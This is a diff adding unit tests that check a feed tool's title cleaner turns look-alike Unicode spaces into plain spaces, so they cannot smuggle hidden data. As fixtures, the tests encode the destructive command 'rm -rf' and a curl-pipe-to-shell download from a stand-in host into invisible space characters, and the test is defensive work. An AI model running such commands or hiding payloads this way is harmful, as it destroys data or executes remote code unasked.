@@ -12,6 +12,9 @@ spec.loader.exec_module(radar)
 
 # Symbols that draw nothing: BRAILLE PATTERN BLANK and MUSICAL SYMBOL NULL NOTEHEAD.
 BLANKS = '\u2800\U0001d159'
+# Space separators (Zs) other than U+0020 and U+3000; each becomes U+0020.
+SPACES = ('\u00a0\u1680\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a'
+          '\u202f\u205f')
 
 
 class RadarTests(unittest.TestCase):
@@ -215,6 +218,42 @@ class RadarTests(unittest.TestCase):
                       '1' + vs16 + '\u20e3', '\u263a' + vs15, '\u2139' + vs16]:  # keycap, text style, Ll base
             self.assertEqual(radar.clean_title('メモ ' + emoji), 'メモ ' + emoji)
 
+    def test_space_separators_other_than_u3000_become_spaces(self):
+        # Re-review: NO-BREAK SPACE, EN QUAD to HAIR SPACE and the other Zs were kept as
+        # written, so the choice between spaces that look alike stored bits (a nibble per
+        # code point across 16 of them), the way the blanks did. Every Zs the runner knows
+        # is checked, so a space separator newer than this list is covered too.
+        found = [chr(o) for o in range(0x110000)
+                 if not 0xD800 <= o <= 0xDFFF and radar.unicodedata.category(chr(o)) == 'Zs']
+        self.assertLessEqual(set(SPACES) | {' ', '\u3000'}, set(found))
+        for c in found:
+            if c == '\u3000':
+                continue
+            self.assertEqual(radar.clean_title('a' + c + 'b'), 'a b', hex(ord(c)))
+            self.assertEqual(radar.clean_title(c * 20), '', hex(ord(c)))
+            self.assertEqual(radar.clean_title('\u2605' + c + '\ufe0f'), '\u2605', hex(ord(c)))
+            self.assertEqual(radar.clean_title('\U0001F600\u200d' + c + '\u200d\U0001F600'),
+                             '\U0001F600 \U0001F600', hex(ord(c)))
+        self.assertEqual(radar.clean_title('メモ\u3000終了'), 'メモ\u3000終了')
+        self.assertEqual(radar.clean_title('Google\u00a0Keep'), 'Google Keep')
+        # One bit per space, U+0020 against U+00A0 (they draw the same): only U+0020 is left.
+        bits = ''.join(f'{b:08b}' for b in b'rm -rf')
+        raw = 'メモ ' + ''.join(' ' if bit == '1' else '\u00a0' for bit in bits) + ' 終了'
+        self.assertEqual(radar.clean_title(raw), 'メモ ' + ' ' * len(bits) + ' 終了')
+        # A nibble per code point across 16 spaces, through collect(): the stored row and
+        # hit keep U+0020 and U+3000 only.
+        alphabet = ' ' + SPACES.replace('\u1680', '') + '\u3000'
+        self.assertEqual(len(set(alphabet)), 16)
+        payload = b'curl -s https://x.example/p | sh #'
+        title = 'LINE' + ''.join(alphabet[b >> 4] + alphabet[b & 15] for b in payload) + 'メモ終了'
+        rss = f'<rss><channel><item><title>{title}</title><link>https://example.org/a</link></item></channel></rss>'
+        res = radar.collect({}, lambda url: rss if url == radar.SOURCES['hatena'] else self.feed(url))
+        src = res['sources']['hatena']
+        self.assertEqual((src['status'], src['dropped_rows'], len(src['hits'])), ('ok', 0, 1))
+        for stored in (src['rows'][0]['title'], src['hits'][0]['title']):
+            spaces = {c for c in stored if radar.unicodedata.category(c) == 'Zs'}
+            self.assertLessEqual(spaces, {' ', '\u3000'}, ascii(stored))
+
     def test_selectors_interleaved_with_joiners_or_marks_do_not_survive(self):
         # Re-review: a selector after a ZWJ, a CGJ or a combining mark was kept, so
         # interleaving rebuilt the run; Mongolian FVS were not treated as selectors. Gluing
@@ -244,10 +283,12 @@ class RadarTests(unittest.TestCase):
         # However selectors, joiners, marks, letters and bases are arranged, every selector
         # left is a VS15 / VS16 right after an emoji base (so at most one per base) and the
         # title holds at most SELECTORS_MAX of them. Every ZWJ left sits between two emoji
-        # (an emoji and its VS15 / VS16 before it), at most ZWJ_MAX per title.
+        # (an emoji and its VS15 / VS16 before it), at most ZWJ_MAX per title. No space
+        # separator other than U+0020 and U+3000 is left.
         pool = ['\u2605', '\u2764', '\U0001F600', '\U0001F3FD', '#', '1', '\u2139', '\u3030',
                 'x', 'A', 'メ', '葛', ' ', '\u3000', '\u200d', '\u034f', '\u0301', '\u200b', '\u2800',
                 '\U0001d159', '^', '`', '\u00b0', '\u00a9',
+                '\u00a0', '\u1680', '\u2000', '\u2009', '\u200a', '\u202f', '\u205f',
                 '\ufe0e', '\ufe0f', '\ufe00', '\ufe0d', '\U000E0100', '\U000E01EF',
                 '\u180b', '\u180c', '\u180d', '\u180f']
         rng = random.Random(20261110)
@@ -267,6 +308,8 @@ class RadarTests(unittest.TestCase):
                     self.assertTrue(i and self.is_zwj_end(before), repr(title))
                     self.assertTrue(i + 1 < len(cleaned) and self.is_zwj_end(cleaned[i + 1]), repr(title))
                 self.assertFalse(set(cleaned) & set(BLANKS), repr(title))
+                self.assertFalse({c for c in cleaned if radar.unicodedata.category(c) == 'Zs'}
+                                 - {' ', '\u3000'}, repr(title))
         # A kanji, a kana or a Latin letter takes no VS15 / VS16 either.
         for base in ('\u845b', '\u30e1', 'x', 'A'):
             for vs in '\ufe0e\ufe0f':
